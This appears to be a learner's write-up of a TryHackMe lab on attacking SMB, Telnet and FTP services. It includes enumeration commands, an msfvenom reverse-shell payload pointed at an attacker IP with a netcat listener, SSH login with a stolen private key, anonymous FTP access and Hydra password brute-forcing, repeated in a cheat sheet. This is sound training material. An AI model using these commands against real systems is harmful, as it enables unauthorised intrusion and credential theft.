# 🛡️ TryHackMe — Network Services (Room 2)

> **Platform:** TryHackMe
> **Room Name:** `Network Services`
> **Category:** Enumeration & Exploitation of Common Network Services
> **Skills Covered:** SMB, Telnet, FTP Enumeration & Exploitation, Reverse Shells, Brute Forcing

---

## 📌 Room Overview

This room focuses on enumerating and exploiting three of the most common network services found in real-world penetration testing engagements:

| Service | Default Port(s) | Protocol |
|---------|------------------|----------|
| **SMB** (Server Message Block) | 445 | TCP |
| **Telnet** | 23 | TCP |
| **FTP** (File Transfer Protocol) | 20 (Data) / 21 (Command) | TCP |

The goal was to enumerate each service, identify misconfigurations (like publicly exposed files, anonymous logins, and weak credentials), and use that information to gain a foothold on the target machine — ultimately escalating to a full shell via SSH.

---

## 🗂️ 1. SMB (Server Message Block)

**Default Port:** `445`

SMB allows file and printer sharing across a network. It's one of the most commonly misconfigured services, often leaking sensitive files through open shares.

### 🔍 Enumeration

```bash
enum4linux -a <ipaddress>
```
> Provides full enumeration of a target — users, shares, OS info, groups, and policies.

### 📁 Finding & Accessing Shares

```bash
smbclient //<ipaddress>/<sharefoldername> -U <username> -p <portno>
```

Once inside, search for share folders/drives and look for files that are **publicly exposed by mistake** — this is a common misconfiguration to exploit.

```bash
get <file.txt>
```
> Downloads the required file to your local Linux machine.

```bash
cat <file.txt>
```
> Reveals usernames and hints about hidden services.

### 🔑 Privilege Escalation via SSH Keys

While enumerating, look inside **hidden service folders** for private keys (e.g., `id_rsa`).

```bash
chmod 600 id_rsa
ssh -i id_rsa <username>@<ipaddress>
```
> Sets correct permissions on the private key, then logs in via SSH using the key instead of a password.

```bash
cat smb.txt
```
> Grab the final flag/proof of exploitation.

---

## 📟 2. Telnet

**Default Port:** `23` *(TCP-based, considered the outdated predecessor of SSH)*

Telnet transmits data — including credentials — **in plaintext**, making it a high-value target if found open.

### 🔍 Enumeration

```bash
nmap -p- -T4 --min-rate 1000 <ipaddress>
```
> Scans **all 65535 ports**, sending 1000 packets/sec for a fast, thorough scan.

```bash
telnet <ipaddress> <portno>
```
> Used for connecting to the service, and also for **banner grabbing**:
```
GET / HTTP/1.1
Host: <telnet-service>
```

### ⚔️ Exploitation

Set up a listener using `tcpdump` to catch ICMP traffic (useful for confirming reverse connections/backdoor pings):

```bash
tcpdump ip proto \icmp -i tun0
```

---

## 🎯 3. Gaining Shell Access — Backdoor & Reverse Shell

Once inside the backdoor shell, confirm connectivity back to the attacker machine:

```bash
.RUN ping 192.168.158.99 -c 1   # attacker IP address
```

### 🧨 Generating a Payload with `msfvenom`

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.158.99 LPORT=4444 R
```

### 👂 Setting Up the Listener

```bash
nc -lvnp 4444
```

Copy the generated payload output and execute it on the target/backdoor shell to receive a full reverse shell connection on your local machine.

---

## 📂 4. FTP (File Transfer Protocol)

**Default Ports:** `20` (Data) & `21` (Command)

FTP is one of the oldest network services and, like Telnet, **transmits data in unencrypted plaintext** — including login credentials.

### 💡 Quick Concept (Easy Analogy)

| Protocol | Analogy |
|----------|---------|
| **FTP** | Like a **post office** 📮 — you send (upload) or receive (download) files, but you can't work on them directly; you must bring them to your own machine first. |
| **SMB** | Like a **shared cupboard** 🗄️ — sits right in your network; you can open, edit, and save files directly, in real time, as if they were on your own machine. |

### 🔑 Enumeration & Exploitation

```bash
ftp <ipaddress>
```

**Try anonymous login first:**
```
Username: anonymous
```
> ✅ Often results in successful login **without any password**.

Download available files and look for usernames, then move on to a brute-force attack using Hydra:

```bash
hydra -l mike -P /usr/share/wordlists/rockyou.txt -vV <ipaddress> ftp
```

Once the correct password is cracked, log in successfully to the FTP server.

> ⚠️ **Note:** FTP (like Telnet) allows anonymous logins and transmits data in **unencrypted** form, making it highly vulnerable to sniffing on unsecured networks.

---

## ⚡ Quick Revision — Command Cheat Sheet

| Purpose | Command |
|---------|---------|
| Full SMB enumeration | `enum4linux -a <ip>` |
| Connect to SMB share | `smbclient //<ip>/<share> -U <user> -p <port>` |
| Download file (SMB) | `get <file>` |
| Fix key permissions | `chmod 600 id_rsa` |
| SSH login with key | `ssh -i id_rsa <user>@<ip>` |
| Full port scan (fast) | `nmap -p- -T4 --min-rate 1000 <ip>` |
| Telnet connect / banner grab | `telnet <ip> <port>` |
| ICMP listener | `tcpdump ip proto \icmp -i tun0` |
| Ping check from shell | `.RUN ping <attacker-ip> -c 1` |
| Generate reverse shell payload | `msfvenom -p cmd/unix/reverse_netcat LHOST=<ip> LPORT=4444 R` |
| Start netcat listener | `nc -lvnp 4444` |
| FTP connect | `ftp <ip>` |
| Brute-force FTP creds | `hydra -l <user> -P rockyou.txt -vV <ip> ftp` |

---

## 🧠 Key Concepts to Remember

- ✅ **SMB (445)** → File sharing; enumerate shares, check for exposed files & private keys.
- ✅ **Telnet (23)** → Plaintext, outdated; great for banner grabbing.
- ✅ **FTP (20/21)** → File transfer; **always test anonymous login first** before brute-forcing.
- ✅ Always chain enumeration → found credentials/keys → gain shell access → escalate.
- ✅ Misconfigured shares & anonymous logins are among the **most common real-world vulnerabilities**.

---

## 🏁 Conclusion

This room strengthened my understanding of enumerating and exploiting core network services (SMB, Telnet, FTP), generating payloads with `msfvenom`, setting up listeners, and using tools like `Hydra` and `enum4linux` in a realistic penetration testing workflow.

---

📌 *Room completed on [TryHackMe](https://tryhackme.com) — Network Services*
✍️ Write-up by **[Your Name]**
